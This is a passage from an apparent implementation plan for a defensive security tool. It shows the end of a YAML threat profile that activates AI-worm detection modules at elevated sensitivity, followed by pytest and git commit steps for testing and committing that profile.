    sensitivity: elevated
  ai_worm_git_ssh:
    sensitivity: elevated
  ai_worm_persistence:
    sensitivity: elevated
  ai_worm_network:
    sensitivity: elevated
  ai_worm_lateral:
    sensitivity: elevated
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_ai_worm_profile.py -v`
Expected: All tests PASS

- [ ] **Step 5: Run the full test suite**

Run: `python -m pytest tests/test_ioc_loader.py tests/test_module_ai_worm_filesystem.py tests/test_module_ai_worm_git_ssh.py tests/test_module_ai_worm_persistence.py tests/test_module_ai_worm_network.py tests/test_module_ai_worm_lateral.py tests/test_module_mvt_spyware_scan.py tests/test_ai_worm_profile.py -v`
Expected: All tests PASS

- [ ] **Step 6: Commit**

```bash
git add profiles/ai_worm_response.yaml tests/test_ai_worm_profile.py
git commit -m "feat: add ai_worm_response threat profile activating all worm detection modules"
```
